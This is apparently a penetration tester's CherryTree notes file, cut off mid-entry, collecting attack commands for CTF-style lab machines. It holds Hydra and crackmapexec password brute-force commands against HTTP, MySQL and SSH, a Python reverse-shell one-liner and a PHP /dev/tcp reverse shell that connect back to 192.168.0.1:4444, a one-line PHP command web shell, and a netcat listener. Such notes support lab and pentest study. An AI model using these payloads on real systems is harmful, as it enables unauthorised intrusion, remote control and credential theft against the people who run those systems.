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</encoded_png>
        <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type root.txt &amp;&amp; ipconfig /all</codebox>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1706989762">
      <rich_text>
☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 103">DNS</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 42">PrivEsc</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 106">SNMP</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.10.169 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 10.10.10.169 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.169 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.10.10.169:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

_______________________________</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>________


SSH



or if th</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>at doesnt work

</rich_text>
          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.169</codebox>
          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.169 -u patrick -p /usr/share/wordlists/rockyou.txt
</codebox>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1701626719">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
